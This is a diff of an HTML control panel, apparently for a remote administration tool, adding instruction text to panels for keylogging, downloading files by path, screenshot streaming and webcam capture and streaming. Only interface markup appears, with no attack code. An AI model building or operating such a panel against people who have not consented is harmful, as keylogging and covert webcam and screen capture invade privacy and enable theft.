@@ -33,6 +33,11 @@
             </div>
 
             <div id="keylog" class="panel">
+                <div class="instruction">
+                    <p>CLick HOOK to start capturing keylog. Do not CLICK 2 times. Just CLICK after EXIT.</p>
+                    <p>Click PRINT to print captured key</p>
+                    <p>CLick EXIT to stop capturing keylog</p>
+                </div>
                 <div class="btn-controll">
                     <button data-command="HOOK">HOOK</button>
                     <button data-command="UNHOOK">UNHOOK</button>
@@ -43,8 +48,11 @@
             </div>
             
             <div id="download" class="panel">
+                <div class="instruction">
+                    <p>System just support downloading (.txt, .pdf, .jpg, .png) files.</p>
+                </div>
                 <div class="btn-controll">
-                    <p id="noti">System just support downloading (.txt, .pdf, .jpg, .png) files.</p>
+                    
                     Enter file path: <input type="text" id="filepath">
                     <button data-command="DOWNLOAD">DOWNLOAD</button>
                 </div>
@@ -52,6 +60,12 @@
             </div>
 
             <div id="screenshot" class="panel">
+                <div class="instruction">
+                    <p>CLick TAKE to take screenshot</p>
+                    <p>Click START STREAM to start streaming the screen</p>
+                    <p>Click STOP STREAM to stop streaming the screen</p>
+                    <p>CLick SAVE to save the currently screen that appears in the UI</p>
+                </div>
                 <div class="btn-controll">
                     <button data-command="SCREENSHOT-TAKE">TAKE</button>
                     <button data-command="SCREENSHOT-STREAM">START STREAM</button>
@@ -62,6 +76,13 @@
             </div>
 
             <div id="webcam" class="panel">
+                <div class="instruction">
+                    <p>CLick START to start webcam (must START FIRST)</p>
+                    <p>Click GET to take a selfile</p>
+                    <p>Click STREAM to start streaming webcam</p>
+                    <p>Click STOP to stop streaming webcam</p>
+                    <p>CLick SAVE to save the currently frame that appears in the UI</p>
+                </div>
                 <div class="btn-controll">
                     <button data-command="WEBCAM-START">START</button>
                     <button data-command="WEBCAM-GET">GET</button>
